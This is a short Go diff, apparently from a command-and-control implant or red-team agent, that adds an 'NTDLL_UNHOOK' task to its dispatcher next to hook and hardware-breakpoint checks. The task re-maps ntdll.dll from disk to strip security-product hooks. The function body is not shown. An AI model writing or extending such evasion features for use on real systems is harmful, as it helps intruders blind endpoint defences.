@@ -238,6 +238,10 @@ func dispatchTask(t transport, task taskWire) {
 	case "HOOK_CHECK":
 		t.sendResult(task.ID, checkHooks(), "")
 
+	case "NTDLL_UNHOOK":
+		unhookNtdll()
+		t.sendResult(task.ID, "[+] ntdll.dll re-mapped from disk", "")
+
 	case "HW_BP_CHECK":
 		if hasHWBreakpoints() {
 			t.sendResult(task.ID, "[!] Hardware breakpoints DETECTED on current thread (DR0-DR3 non-zero)", "")
